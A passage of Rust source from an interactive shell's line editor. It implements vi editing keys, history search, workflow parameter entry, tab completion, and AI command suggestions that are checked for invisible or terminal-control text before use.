                            self.cursor = start.min(self.buffer.len().saturating_sub(1));
                        }
                    }
                    KeyCode::Char('w') => {
                        // dw: delete word
                        let start = self.cursor;
                        self.vi_word_forward();
                        let end = self.cursor;
                        self.buffer.drain(start..end);
                        self.cursor = start;
                    }
                    KeyCode::Char('$') => {
                        // d$: delete to end of line
                        let end = self.current_line_end();
                        self.buffer.drain(self.cursor..end);
                    }
                    KeyCode::Char('0') => {
                        // d0: delete to start of line
                        let start = self.last_line_start();
                        self.buffer.drain(start..self.cursor);
                        self.cursor = start;
                    }
                    _ => {}
                }
            }
            'c' => {
                match key.code {
                    KeyCode::Char('c') => {
                        // cc: change entire line
                        let start = self.last_line_start();
                        let end = self.current_line_end();
                        self.buffer.drain(start..end);
                        self.cursor = start;
                        self.vi_mode = ViMode::Insert;
                        print!("\x1b[5 q");
                    }
                    KeyCode::Char('w') => {
                        // cw: change word
                        let start = self.cursor;
                        self.vi_word_forward();
                        let end = self.cursor;
                        self.buffer.drain(start..end);
                        self.cursor = start;
                        self.vi_mode = ViMode::Insert;
                        print!("\x1b[5 q");
                    }
                    _ => {}
                }
            }
            'r' => {
                // Replace single character
                if let KeyCode::Char(c) = key.code {
                    if self.cursor < self.buffer.len()
                        && !crate::terminal_text::is_terminal_ambiguous(c)
                    {
                        let old_char = self.buffer[self.cursor..].chars().next().unwrap();
                        self.buffer.replace_range(
                            self.cursor..self.cursor + old_char.len_utf8(),
                            &c.to_string(),
                        );
                    }
                }
            }
            _ => {}
        }
        Ok(KeyAction::Continue)
    }

    fn handle_search_key(&mut self, key: KeyEvent, history: &mut History) -> io::Result<KeyAction> {
        let search = self.search_mode.as_mut().unwrap();
        match key.code {
            KeyCode::Esc => {
                self.search_mode = None;
            }
            KeyCode::Enter => {
                if let Some((result, _, _, _)) = search.rich_results.get(search.selected) {
                    self.buffer = result.clone();
                    self.cursor = self.buffer.len();
                }
                self.search_mode = None;
            }
            KeyCode::Up | KeyCode::Char('p')
                if key.code == KeyCode::Up || key.modifiers == KeyModifiers::CONTROL =>
            {
                if !search.rich_results.is_empty() {
                    if search.selected > 0 {
                        search.selected -= 1;
                    }
                    if let Some((result, _, _, _)) = search.rich_results.get(search.selected) {
                        self.buffer = result.clone();
                        self.cursor = self.buffer.len();
                    }
                }
            }
            KeyCode::Down | KeyCode::Char('n')
                if key.code == KeyCode::Down || key.modifiers == KeyModifiers::CONTROL =>
            {
                if !search.rich_results.is_empty() {
                    search.selected = (search.selected + 1).min(search.rich_results.len() - 1);
                    if let Some((result, _, _, _)) = search.rich_results.get(search.selected) {
                        self.buffer = result.clone();
                        self.cursor = self.buffer.len();
                    }
                }
            }
            KeyCode::Char('r') if key.modifiers == KeyModifiers::CONTROL => {
                if !search.rich_results.is_empty() {
                    search.selected = (search.selected + 1) % search.rich_results.len();
                    if let Some((result, _, _, _)) = search.rich_results.get(search.selected) {
                        self.buffer = result.clone();
                        self.cursor = self.buffer.len();
                    }
                }
            }
            KeyCode::Backspace => {
                search.query.pop();
                search.rich_results = history.search_fuzzy_rich(&search.query);
                search.results = search
                    .rich_results
                    .iter()
                    .map(|(cmd, idx, _, _)| (cmd.clone(), idx.clone()))
                    .collect();
                search.selected = 0;
                if let Some((result, _, _, _)) = search.rich_results.first() {
                    self.buffer = result.clone();
                    self.cursor = self.buffer.len();
                }
            }
            KeyCode::Char(c)
                if key.modifiers == KeyModifiers::NONE || key.modifiers == KeyModifiers::SHIFT =>
            {
                if crate::terminal_text::is_terminal_ambiguous(c) {
                    return Ok(KeyAction::Continue);
                }
                search.query.push(c);
                search.rich_results = history.search_fuzzy_rich(&search.query);
                search.results = search
                    .rich_results
                    .iter()
                    .map(|(cmd, idx, _, _)| (cmd.clone(), idx.clone()))
                    .collect();
                search.selected = 0;
                if let Some((result, _, _, _)) = search.rich_results.first() {
                    self.buffer = result.clone();
                    self.cursor = self.buffer.len();
                }
            }
            _ => {
                self.search_mode = None;
            }
        }
        Ok(KeyAction::Continue)
    }

    fn handle_workflow_key(&mut self, key: KeyEvent, state: &ShellState) -> io::Result<KeyAction> {
        if key.code == KeyCode::Esc {
            self.cancel_workflow();
            return Ok(KeyAction::Continue);
        }
        if key.modifiers.contains(KeyModifiers::CONTROL) {
            match key.code {
                KeyCode::Char('c') => {
                    self.cancel_workflow();
                    return Ok(KeyAction::Interrupt);
                }
                KeyCode::Char('d') => {
                    self.cancel_workflow();
                    return Ok(KeyAction::Eof);
                }
                _ => {}
            }
        }

        let filling_parameters = self
            .workflow_mode
            .as_ref()
            .is_some_and(|mode| mode.session.is_some());
        if filling_parameters {
            self.handle_workflow_parameter_key(key);
        } else {
            self.handle_workflow_search_key(key, state);
        }
        Ok(KeyAction::Continue)
    }

    fn handle_workflow_search_key(&mut self, key: KeyEvent, state: &ShellState) {
        match key.code {
            KeyCode::Enter => {
                let selected = self
                    .workflow_mode
                    .as_ref()
                    .and_then(|mode| mode.results.get(mode.selected).cloned());
                let Some(workflow) = selected else {
                    return;
                };
                match workflows::WorkflowSession::new(workflow) {
                    Ok(session) if session.is_complete() => match session.render() {
                        Ok(command) => self.finish_workflow(command),
                        Err(error) => self.ai_error = Some(format!("Workflow error: {error}")),
                    },
                    Ok(session) => {
                        if let Some(mode) = self.workflow_mode.as_mut() {
                            mode.session = Some(session);
                            mode.suggestion_selected = None;
                        }
                    }
                    Err(error) => self.ai_error = Some(format!("Workflow error: {error}")),
                }
            }
            KeyCode::Up => {
                if let Some(mode) = self.workflow_mode.as_mut() {
                    mode.selected = mode.selected.saturating_sub(1);
                }
            }
            KeyCode::Down => {
                if let Some(mode) = self.workflow_mode.as_mut() {
                    if !mode.results.is_empty() {
                        mode.selected = (mode.selected + 1).min(mode.results.len() - 1);
                    }
                }
            }
            KeyCode::Backspace => {
                if let Some(mode) = self.workflow_mode.as_mut() {
                    mode.query.pop();
                    mode.results = state
                        .workflow_registry
                        .search(&mode.query)
                        .into_iter()
                        .cloned()
                        .collect();
                    mode.selected = 0;
                }
            }
            KeyCode::Char(character)
                if key.modifiers == KeyModifiers::NONE || key.modifiers == KeyModifiers::SHIFT =>
            {
                if crate::terminal_text::is_terminal_ambiguous(character) {
                    return;
                }
                if let Some(mode) = self.workflow_mode.as_mut() {
                    mode.query.push(character);
                    mode.results = state
                        .workflow_registry
                        .search(&mode.query)
                        .into_iter()
                        .cloned()
                        .collect();
                    mode.selected = 0;
                }
            }
            _ => {}
        }
    }

    fn handle_workflow_parameter_key(&mut self, key: KeyEvent) {
        match key.code {
            KeyCode::Enter => {
                let completed_command = self.workflow_mode.as_mut().and_then(|mode| {
                    let session = mode.session.as_mut()?;
                    mode.suggestion_selected = None;
                    if session.current_index() + 1 >= session.parameter_count() {
                        // Rendering can fail (most notably at the bounded
                        // expansion limit).  Validate the completed command
                        // before advancing to the terminal session state so
                        // the user can still edit the final parameter.
                        Some(session.preview())
                    } else {
                        session.advance();
                        None
                    }
                });
                match completed_command {
                    Some(Ok(command)) => self.finish_workflow(command),
                    None => {}
                    Some(Err(error)) => self.ai_error = Some(format!("Workflow error: {error}")),
                }
            }
            KeyCode::Tab | KeyCode::Down => self.step_workflow_suggestion(1),
            KeyCode::BackTab | KeyCode::Up => self.step_workflow_suggestion(-1),
            KeyCode::Backspace => {
                if let Some(mode) = self.workflow_mode.as_mut() {
                    if let Some(session) = mode.session.as_mut() {
                        session.pop_current();
                    }
                    mode.suggestion_selected = None;
                }
            }
            KeyCode::Char(character)
                if key.modifiers == KeyModifiers::NONE || key.modifiers == KeyModifiers::SHIFT =>
            {
                if crate::terminal_text::is_terminal_ambiguous(character) {
                    return;
                }
                if let Some(mode) = self.workflow_mode.as_mut() {
                    let result = mode
                        .session
                        .as_mut()
                        .map(|session| session.push_current(character));
                    mode.suggestion_selected = None;
                    if let Some(Err(error)) = result {
                        self.ai_error = Some(format!("Workflow error: {error}"));
                    }
                }
            }
            _ => {}
        }
    }

    fn handle_workflow_paste(&mut self, text: &str, state: &ShellState) {
        if !crate::terminal_text::is_safe_inline(text) {
            self.ai_error =
                Some("Workflow paste rejected: invisible or terminal-control text".to_string());
            return;
        }
        let Some(mode) = self.workflow_mode.as_mut() else {
            return;
        };
        if let Some(session) = mode.session.as_mut() {
            let value = format!("{}{}", session.current_value().unwrap_or_default(), text);
            if let Err(error) = session.set_current_value(value) {
                self.ai_error = Some(format!("Workflow error: {error}"));
            }
            mode.suggestion_selected = None;
        } else {
            mode.query.push_str(text);
            mode.results = state
                .workflow_registry
                .search(&mode.query)
                .into_iter()
                .cloned()
                .collect();
            mode.selected = 0;
        }
    }

    fn step_workflow_suggestion(&mut self, direction: isize) {
        let Some(mode) = self.workflow_mode.as_mut() else {
            return;
        };
        let Some(session) = mode.session.as_mut() else {
            return;
        };
        let suggestions = session
            .current_placeholder()
            .map(|parameter| parameter.suggestions.clone())
            .unwrap_or_default();
        if suggestions.is_empty() {
            return;
        }

        let next = match mode.suggestion_selected {
            Some(selected) => {
                (selected as isize + direction).rem_euclid(suggestions.len() as isize) as usize
            }
            None if direction < 0 => suggestions.len() - 1,
            None => 0,
        };
        if let Err(error) = session.set_current_value(suggestions[next].clone()) {
            self.ai_error = Some(format!("Workflow error: {error}"));
            return;
        }
        mode.suggestion_selected = Some(next);
    }

    fn open_workflow(&mut self, state: &ShellState) {
        let results = state.workflow_registry.all().into_iter().cloned().collect();
        self.workflow_mode = Some(WorkflowMode {
            query: String::new(),
            results,
            selected: 0,
            original_input: WorkflowInputSnapshot {
                buffer: self.buffer.clone(),
                cursor: self.cursor,
                suggestion: self.suggestion.clone(),
            },
            session: None,
            suggestion_selected: None,
        });
    }

    fn finish_workflow(&mut self, command: String) {
        self.buffer = command;
        self.cursor = self.buffer.len();
        self.suggestion = None;
        self.workflow_mode = None;
    }

    fn cancel_workflow(&mut self) {
        let Some(mode) = self.workflow_mode.take() else {
            return;
        };
        self.buffer = mode.original_input.buffer;
        self.cursor = mode.original_input.cursor.min(self.buffer.len());
        self.suggestion = mode.original_input.suggestion;
    }

    /// Narrow the open menu by one typed character, or widen it by one
    /// backspace, without re-running completion.
    ///
    /// The menu's candidates were computed for the word as it stood when it
    /// opened; typing filters that same set. When nothing survives, the menu
    /// closes and the keystroke lands as ordinary input — the word has moved
    /// past anything that was on offer.
    fn narrow_completion_menu(&mut self, key: KeyCode) {
        let Some(menu) = self.completion_menu.as_mut() else {
            return;
        };
        let mut word = menu.original_word.clone();
        match key {
            KeyCode::Char(ch) => word.push(ch),
            KeyCode::Backspace => {
                if word.pop().is_none() {
                    self.completion_menu = None;
                    return;
                }
            }
            _ => return,
        }

        let matching: Vec<Completion> = menu
            .completions
            .iter()
            .filter(|candidate| !completer::match_positions(&candidate.text, &word).is_empty())
            .cloned()
            .collect();

        // Put the word back on the line as typed, whatever happens next.
        let word_start = menu.word_start;
        self.buffer.replace_range(word_start..self.cursor, &word);
        self.cursor = word_start + word.len();

        if matching.is_empty() {
            self.completion_menu = None;
            return;
        }
        menu.original_word = word;
        menu.completions = matching;
        menu.selected = 0;
        // Show what accepting the first survivor would give.
        let text = menu.completions[0].text.clone();
        self.buffer.replace_range(word_start..self.cursor, &text);
        self.cursor = word_start + text.len();
    }

    /// What separates one accepted piece of a suggestion from the next.
    /// Path separators count, so accepting a long path arrives one directory
    /// at a time rather than all at once.
    fn is_suggestion_gap(ch: char) -> bool {
        ch.is_whitespace() || ch == '/' || ch == '=' || ch == ':'
    }

    /// Append the first word of the ghost suggestion, keeping the rest as a
    /// ghost. A word here is a run of separators plus the text that follows,
    /// so accepting from `" origin main"` gives `" origin"` and leaves
    /// `" main"` — one press, one meaningful piece.
    fn accept_suggestion_word(&mut self) {
        let Some(suggestion) = self.suggestion.take() else {
            return;
        };
        let taken: String = {
            let mut chars = suggestion
                .char_indices()
                .skip_while(|(_, ch)| Self::is_suggestion_gap(*ch));
            let end = chars
                .find(|(_, ch)| Self::is_suggestion_gap(*ch))
                .map(|(index, _)| index)
                .unwrap_or(suggestion.len());
            suggestion[..end].to_string()
        };
        self.buffer.push_str(&taken);
        self.cursor = self.buffer.len();
        let rest = &suggestion[taken.len()..];
        self.suggestion = (!rest.is_empty()).then(|| rest.to_string());
    }

    /// Remember a completion that was actually taken, so it leads the list
    /// next time. Recorded on acceptance, never on merely being shown or
    /// cycled past — the point is which candidate was wanted.
    fn record_accepted_completion(&self, word_start: usize, text: &str, state: &ShellState) {
        if let Some(cmd) = completer::command_at(&self.buffer, word_start, state) {
            completer::record_accepted(&cmd, text);
        }
    }

    /// Move the completion menu's selection by `step`, wrapping at both ends,
    /// and put the newly selected candidate in the buffer so the line always
    /// shows what accepting it would give.
    fn step_completion_menu(&mut self, step: isize) {
        let Some(menu) = self.completion_menu.as_mut() else {
            return;
        };
        let count = menu.completions.len();
        if count == 0 {
            return;
        }
        let selected = menu.selected as isize + step;
        menu.selected = selected.rem_euclid(count as isize) as usize;
        let text = menu.completions[menu.selected].text.clone();
        let word_start = menu.word_start;
        self.buffer.replace_range(word_start..self.cursor, &text);
        self.cursor = word_start + text.len();
    }

    fn handle_tab(&mut self, state: &mut ShellState) {
        if let Some(ref mut menu) = self.completion_menu {
            menu.selected = (menu.selected + 1) % menu.completions.len();
            let text = menu.completions[menu.selected].text.clone();
            self.buffer
                .replace_range(menu.word_start..self.cursor, &text);
            self.cursor = menu.word_start + text.len();
            return;
        }

        let (word_start, completions) = completer::complete(&self.buffer, self.cursor, state);

        match completions.len() {
            0 => {}
            1 => {
                let text = &completions[0].text;
                self.record_accepted_completion(word_start, text, state);
                self.buffer.replace_range(word_start..self.cursor, text);
                self.cursor = word_start + text.len();
                if !completions[0].is_dir {
                    self.buffer.insert(self.cursor, ' ');
                    self.cursor += 1;
                }
            }
            _ => {
                let common = common_prefix(&completions);
                if common.len() > self.cursor - word_start {
                    self.buffer.replace_range(word_start..self.cursor, &common);
                    self.cursor = word_start + common.len();
                } else {
                    let original_word = self.buffer[word_start..self.cursor].to_string();
                    self.completion_menu = Some(CompletionMenu {
                        completions,
                        selected: 0,
                        word_start,
                        original_word,
                    });
                    // Immediately apply first completion inline
                    if let Some(ref menu) = self.completion_menu {
                        let text = menu.completions[0].text.clone();
                        self.buffer.replace_range(word_start..self.cursor, &text);
                        self.cursor = word_start + text.len();
                    }
                }
            }
        }
    }

    fn build_ai_context(&self, _state: &ShellState, history: &History) -> AiContext {
        let cwd_path = std::env::current_dir().unwrap_or_default();
        let cwd = cwd_path.display().to_string();
        let os = std::env::consts::OS.to_string();
        let recent_history = if self.ai_include_extended_context {
            history
                .entries()
                .iter()
                .rev()
                .take(5)
                .map(|s| s.to_string())
                .collect()
        } else {
            Vec::new()
        };
        let git_status = if self.ai_include_extended_context {
            crate::prompt::bounded_git_stdout(
                &cwd_path,
                &["status", "--short"],
                MAX_AI_GIT_STATUS_PROBE_BYTES,
            )
            .and_then(|output| String::from_utf8(output).ok())
            .filter(|s| !s.is_empty())
        } else {
            None
        };
        AiContext {
            cwd,
            os,
            recent_history,
            git_status,
            last_error: last_error_with_execution_output(
                self.last_error_info.clone(),
                self.last_error_execution_id.as_deref(),
                self.ai_include_extended_context,
                |execution_id| {
                    let journal = crate::execution::ExecutionJournal::configured()?;
                    let record = journal.get(execution_id).ok().flatten()?;
                    record.output.map(|output| output.text)
                },
            ),
        }
    }

    fn ai_generation_prompt(&self) -> Option<&str> {
        self.ai_worker.as_ref()?;
        self.buffer
            .strip_prefix("# ")
            .filter(|prompt| !prompt.is_empty())
    }

    fn snapshot_ai_input(&mut self) {
        self.ai_saved_input = Some(AiInputSnapshot {
            buffer: self.buffer.clone(),
            cursor: self.cursor,
            suggestion: self.suggestion.clone(),
        });
        self.ai_error = None;
    }

    fn restore_ai_input(&mut self) {
        if let Some(saved) = self.ai_saved_input.take() {
            self.buffer = saved.buffer;
            self.cursor = saved.cursor.min(self.buffer.len());
            self.suggestion = saved.suggestion;
        }
    }

    /// Move the agent's review-only prefill into the line buffer.
    ///
    /// This is the last boundary before untrusted text becomes an executable
    /// line: the prompt renders the prefill as ordinary typed input and one
    /// Enter runs it, with no `confirm_danger` RUN gate and no second
    /// validation pass. Anything the review card had to escape in order to
    /// display it would therefore be executed in a spelling the user never saw
    /// — exactly the exact-review break `terminal_text` warns about — so it is
    /// dropped and reported instead of inserted. `agent.rs` already refuses to
    /// produce such a prefill; keeping the check here makes the invariant a
    /// property of the seam rather than of its current only producer.
    fn take_editor_prefill(&mut self, state: &mut ShellState) {
        let Some(prefill) = state.pending_editor_insert.take() else {
            return;
        };
        if crate::terminal_text::is_safe_inline(&prefill) {
            self.buffer.push_str(&prefill);
            self.cursor = self.buffer.len();
        } else {
            self.ai_error = Some(
                "Agent insert rejected: invisible or terminal-control text in the command"
                    .to_string(),
            );
        }
    }

    /// End an in-flight request — both the editor's ownership of the reply and
    /// the work itself.
    ///
    /// Dropping the reply alone was the bug: the worker stayed connected to the
    /// provider, billed, and holding the single in-flight slot until its own
    /// 30 s read timeout, so a third `#`/Ctrl-F/Alt-E inside that window was
    /// refused with nothing shown to the user. Cancelling through the request
    /// id reaches the request wherever it is — still queued, or already in the
    /// transport child, whose process group the worker then kills.
    fn invalidate_ai_request(&mut self, restore_input: bool) {
        if let (Some(active), Some(worker)) = (self.active_ai_request, self.ai_worker.as_ref()) {
            worker.cancel(active.request_id);
        }
        self.active_ai_request = None;
        if restore_input {
            self.restore_ai_input();
        } else {
            self.ai_saved_input = None;
        }

        // Free any occupied response slot now. A response that arrives after
        // this drain is rejected by its request ID on the next periodic drain.
        while self
            .ai_worker
            .as_ref()
            .and_then(AiWorker::try_recv)
            .is_some()
        {}
    }

    fn cancel_ai_for_user_input(&mut self) -> Option<AiRequestKind> {
        let kind = self.active_ai_request.map(|request| request.kind);
        if kind.is_some() {
            self.invalidate_ai_request(true);
        }
        kind
    }

    fn begin_ai_request(
        &mut self,
        kind: AiRequestKind,
        prompt: String,
        context: AiContext,
    ) -> bool {
        // Beginning a new operation supersedes any older prompt, even if the
        // worker has not finished it yet.
        self.invalidate_ai_request(true);
        self.ai_explanation = None;
        self.ai_error = None;

        let Some(request_id) = self.ai_request_sequence.checked_add(1) else {
            self.ai_error = Some("AI error: request ID space exhausted".to_string());
            return false;
        };
        self.ai_request_sequence = request_id;
        let request = AiRequest {
            request_id,
            kind,
            prompt,
            context,
        };
        let Some(worker) = self.ai_worker.as_ref() else {
            return false;
        };
        if let Err(error) = worker.request(request) {
            // A trigger that silently does nothing is indistinguishable from a
            // dead keybinding. Name which of the two happened.
            self.ai_error = Some(
                match error {
                    AiSubmitError::Busy => {
                        "AI error: the previous request is still stopping; press again"
                    }
                    AiSubmitError::Unavailable => "AI error: the AI worker is not running",
                }
                .to_string(),
            );
            return false;
        }
        self.active_ai_request = Some(ActiveAiRequest { request_id, kind });
        true
    }

    fn trigger_ai_generate(
        &mut self,
        prompt_text: &str,
        state: &ShellState,
        history: &History,
    ) -> bool {
        if self.ai_worker.is_none() {
            return false;
        }
        self.invalidate_ai_request(true);
        let ctx = self.build_ai_context(state, history);
        if !self.begin_ai_request(AiRequestKind::Generate, prompt_text.to_string(), ctx) {
            return false;
        }
        self.snapshot_ai_input();
        self.buffer.clear();
        self.buffer.push_str("[AI...]");
        self.cursor = self.buffer.len();
        true
    }

    fn trigger_ai_fix(&mut self, state: &ShellState, history: &History) -> bool {
        if self.last_error_info.is_none() || self.ai_worker.is_none() {
            return false;
        }
        self.invalidate_ai_request(true);
        let ctx = self.build_ai_context(state, history);
        if !self.begin_ai_request(AiRequestKind::Fix, String::new(), ctx) {
            return false;
        }
        self.snapshot_ai_input();
        self.buffer.clear();
        self.buffer.push_str("[AI fixing...]");
        self.cursor = self.buffer.len();
        true
    }

    fn trigger_ai_explain(&mut self, state: &ShellState, history: &History) -> bool {
        if self.ai_worker.is_none() {
            return false;
        }
        self.invalidate_ai_request(true);
        let mut ctx = self.build_ai_context(state, history);
        ctx.last_error = None;
        let command = self.buffer.clone();
        if !self.begin_ai_request(AiRequestKind::Explain, command, ctx) {
            return false;
        }
        true
    }

    /// Apply only the response currently authorized by both ID and operation
    /// kind. Returns whether visible editor state changed.
    fn apply_ai_response(&mut self, response: AiResponse) -> bool {
        let Some(active) = self.active_ai_request else {
            return false;
        };
        if response.request_id() != active.request_id {
            return false;
        }
        self.active_ai_request = None;

        match (active.kind, response) {
            (
                AiRequestKind::Generate | AiRequestKind::Fix,
                AiResponse::Suggestion { command, .. },
            ) => {
                if !crate::terminal_text::is_safe_inline(&command) {
                    self.restore_ai_input();
                    self.ai_error =
                        Some("AI error: suggestion contained invisible terminal text".to_string());
                    return true;
                }
                self.ai_saved_input = None;
                self.ai_explanation = None;
                self.ai_error = None;
                self.buffer.clear();
                self.cursor = 0;
                self.suggestion = Some(command);
                true
            }
            (AiRequestKind::Explain, AiResponse::Explanation { explanation, .. }) => {
                let explanation = match crate::ai::validate_explanation(&explanation) {
                    Ok(explanation) => explanation,
                    Err(_) => {
                        self.restore_ai_input();
                        self.ai_explanation = None;
                        self.ai_error = Some(
                            "AI error: explanation contained unsafe terminal text".to_string(),
                        );
                        return true;
                    }
                };
                // The explanation has no path to either executable state:
                // buffer and suggestion deliberately remain untouched.
                self.ai_saved_input = None;
                self.ai_explanation = Some(explanation);
                self.ai_error = None;
                true
            }
            (_, AiResponse::Error { message, .. }) => {
                self.restore_ai_input();
                self.ai_explanation = None;
                self.ai_error = Some(format_ai_error(&message));
                true
            }
            _ => {
                // A type/operation mismatch is a protocol error. In
                // particular, a Suggestion tagged with an Explain ID is never
                // allowed to become executable state.
                self.restore_ai_input();
                self.ai_explanation = None;
                self.ai_error = Some("AI error: mismatched response type".to_string());
                true
            }
        }
    }

    fn drain_ai_responses(&mut self) -> bool {
        let mut changed = false;
        while let Some(response) = self.ai_worker.as_ref().and_then(AiWorker::try_recv) {
            changed |= self.apply_ai_response(response);
        }
        changed
    }

    fn update_suggestion(&mut self, history: &History, state: &ShellState) {
        if self.completion_menu.is_some()
            || self.search_mode.is_some()
            || self.workflow_mode.is_some()
        {
            self.suggestion = None;
            return;
        }
        let ctx = suggest::SuggestionContext {
            git_branch: state.cached_git_branch.as_deref(),
            git_remote: state.cached_git_remote.as_deref(),
            git_branches: &state.cached_git_branches,
            known_commands: state.path_cache_if_scanned(),
            aliases: Some(&state.aliases),
            git_has_staged: state.cached_git_has_staged,
            git_has_unstaged: state.cached_git_has_unstaged,
            git_has_conflicts: state.cached_git_has_conflicts,
            git_ahead: state.cached_git_ahead,
            git_behind: state.cached_git_behind,
            last_command: state.last_command.as_deref(),
            last_exit_code: state.last_exit_code,
        };
        self.suggestion = suggest::suggest(&self.buffer, history, &ctx)
            .filter(|suggestion| crate::terminal_text::is_safe_inline(suggestion));
    }

    /// Re-read the PTY's window size, reporting whether it changed.
    ///
    /// Also clears the SIGWINCH flag, though the size is polled rather than
    /// gated on it: the row bookkeeping in `repaint` is only correct for the
    /// width the terminal really has, and a missed signal must not freeze the
    /// editor on the size it happened to see at startup.
    fn refresh_terminal_size(&mut self) -> bool {
        SIGWINCH_RECEIVED.swap(false, Ordering::SeqCst);
        match crossterm::terminal::size() {
            Ok((w, h)) if (w, h) != (self.terminal_width, self.terminal_height) => {
                self.terminal_width = w;
                self.terminal_height = h;
                true
            }
            _ => false,
        }
    }

    fn repaint(&mut self, state: &mut ShellState) -> io::Result<()> {
        self.repaint_with_options(state, true)
    }

    fn repaint_for_submit(&mut self, state: &mut ShellState) -> io::Result<()> {
        self.repaint_with_options(state, false)
    }

    fn repaint_with_options(
        &mut self,
        state: &mut ShellState,
        show_signature_hint: bool,
    ) -> io::Result<()> {
        let menu_sel = self.completion_menu.as_ref().map(|m| m.selected);
        let cursor_only = self.search_mode.is_none()
            && self.buffer == self.last_buffer_snapshot
            && self.suggestion == self.last_suggestion_snapshot
            && menu_sel == self.last_menu_snapshot
            && self.ai_explanation == self.last_ai_explanation_snapshot
            && self.ai_error == self.last_ai_error_snapshot
            && self.cursor != self.last_cursor_snapshot;

        self.last_buffer_snapshot = self.buffer.clone();
        self.last_cursor_snapshot = self.cursor;
        self.last_suggestion_snapshot = self.suggestion.clone();
        self.last_menu_snapshot = menu_sel;
        self.last_ai_explanation_snapshot = self.ai_explanation.clone();
        self.last_ai_error_snapshot = self.ai_error.clone();

        let mut out = stdout();

        if state.editing_mode == crate::environment::EditingMode::Vi {
            match self.vi_mode {
                ViMode::Normal => {
                    out.queue(Print("\x1b[1 q"))?;
                }
                ViMode::Insert => {
                    out.queue(Print("\x1b[5 q"))?;
                }
            }
        }

        // Fast path: only cursor moved, skip full redraw. A wrapped input
        // line changes the caret's row, so this only fires while the whole
        // line still fits on the prompt's own row.
        if cursor_only && !self.buffer.contains('\n') {
            let prompt_last = self
                .cached_prompt
                .rsplit('\n')
                .next()
                .unwrap_or(&self.cached_prompt);
            let prompt_width = display_width(prompt_last);
            if prompt_width + display_width(&self.buffer) < self.terminal_width as usize {
                let buf_before = &self.buffer[..self.cursor];
                let col = (prompt_width + display_width(buf_before)) as u16;
                out.queue(MoveToColumn(col))?;
                out.flush()?;
                return Ok(());
            }
        }

        out.queue(MoveToColumn(0))?;
        if self.last_cursor_row > 0 {
            out.queue(MoveUp(self.last_cursor_row))?;
        }
        out.queue(Clear(ClearType::FromCursorDown))?;

        let mut rendered_lines: u16 = 0;
        #[allow(unused_assignments)]
        let mut cursor_row: u16 = 0;
        #[allow(unused_assignments)]
        let mut cursor_col: u16 = 0;

        if let Some(ref search) = self.search_mode {
            use crate::history::History;
            let count = search.rich_results.len();
            let sel = if count > 0 { search.selected + 1 } else { 0 };

            // Search header line
            out.queue(SetForegroundColor(Color::Magenta))?;
            out.queue(SetAttribute(Attribute::Bold))?;
            out.queue(Print(" SEARCH "))?;
            out.queue(ResetColor)?;
            out.queue(SetForegroundColor(Color::Yellow))?;
            out.queue(Print(format!("[{}/{}] ", sel, count)))?;
            out.queue(ResetColor)?;
            let (query_display, query_width) = history_panel_text(
                &search.query,
                (self.terminal_width as usize).saturating_sub(12),
            );
            out.queue(Print(format!("❯ {query_display}")))?;
            out.queue(Print("\r\n"))?;
            rendered_lines += 1;

            // Results panel (up to 8 entries)
            let max_show = 8usize.min(self.terminal_height as usize / 3);
            let tw = self.terminal_width as usize;
            for (i, (cmd, indices, ts, cwd)) in
                search.rich_results.iter().take(max_show).enumerate()
            {
                let is_sel = i == search.selected;

                // Selection marker
                if is_sel {
                    out.queue(SetForegroundColor(Color::Green))?;
                    out.queue(SetAttribute(Attribute::Bold))?;
                    out.queue(Print("▸ "))?;
                } else {
                    out.queue(Print("  "))?;
                }

                // Time + cwd (right-aligned info)
                let time_str = History::format_relative_time(*ts);
                let cwd = cwd
                    .as_ref()
                    .map(|c| {
                        let home = dirs::home_dir().unwrap_or_default();
                        let home_str = home.to_string_lossy();
                        if c.starts_with(home_str.as_ref()) {
                            format!("~{}", &c[home_str.len()..])
                        } else {
                            c.clone()
                        }
                    })
                    .unwrap_or_default();
                let (cwd_str, cwd_width) = history_panel_text(&cwd, (tw / 3).min(40));

                // Command with match highlighting
                let cmd_max = tw.saturating_sub(time_str.len() + cwd_width + 8);
                let (cmd_fragments, cmd_width) = history_panel_fragments(cmd, indices, cmd_max);

                if is_sel {
                    out.queue(SetAttribute(Attribute::Bold))?;
                }

                // Render command with highlighted match chars
                for (fragment, matched) in &cmd_fragments {
                    if *matched {
                        out.queue(SetForegroundColor(Color::Yellow))?;
                        out.queue(SetAttribute(Attribute::Bold))?;
                        out.queue(Print(fragment))?;
                        if is_sel {
                            out.queue(SetForegroundColor(Color::Green))?;
                        } else {
                            out.queue(ResetColor)?;
                        }
                    } else {
                        out.queue(Print(fragment))?;
                    }
                }

                out.queue(ResetColor)?;

                // Metadata (dim, right side)
                if !time_str.is_empty() || !cwd_str.is_empty() {
                    let pad = tw.saturating_sub(cmd_width + time_str.len() + cwd_width + 6);
                    if pad > 0 && pad < tw {
                        out.queue(Print(" ".repeat(pad.min(40))))?;
                    }
                    out.queue(SetAttribute(Attribute::Dim))?;
                    if !cwd_str.is_empty() {
                        out.queue(SetForegroundColor(Color::Blue))?;
                        out.queue(Print(&cwd_str))?;
                        out.queue(Print(" "))?;
                    }
                    if !time_str.is_empty() {
                        out.queue(SetForegroundColor(Color::DarkGrey))?;
                        out.queue(Print(&time_str))?;
                    }
                    out.queue(ResetColor)?;
                }

                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }

            if count > max_show {
                out.queue(SetAttribute(Attribute::Dim))?;
                out.queue(Print(format!("  ... +{} more", count - max_show)))?;
                out.queue(ResetColor)?;
                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }

            cursor_col = (10 + query_width) as u16;
            cursor_row = 0;
        } else {
            // Render prompt (cached — only recomputed at read_line entry).
            // All row accounting is in visual rows: an over-wide line
            // soft-wraps, and counting hard newlines alone makes the next
            // repaint's cursor-up stop short of the top, leaving one more
            // stale copy of the prompt behind per keystroke. The prompt's
            // last line shares its row with the buffer's first line, so its
            // own wrap extras belong to `input_geometry` below, not here.
            let prompt_last_line = self
                .cached_prompt
                .rsplit('\n')
                .next()
                .unwrap_or(&self.cached_prompt);
            let prompt_width = display_width(prompt_last_line);
            let rows_above_input = rows_consumed(&self.cached_prompt, self.terminal_width)
                .saturating_sub(wrap_extra_rows(prompt_width, self.terminal_width));
            rendered_lines += rows_above_input;
            out.queue(Print(&self.cached_prompt))?;

            // Render highlighted buffer with continuation prompts
            let spans = highlighter::highlight(&self.buffer, state);
            let cont_prompt = prompt::render_continuation_prompt();
            for span in &spans {
                if let Some(color) = span.fg {
                    out.queue(SetForegroundColor(color))?;
                }
                if span.bold {
                    out.queue(SetAttribute(Attribute::Bold))?;
                }
                if span.underline {
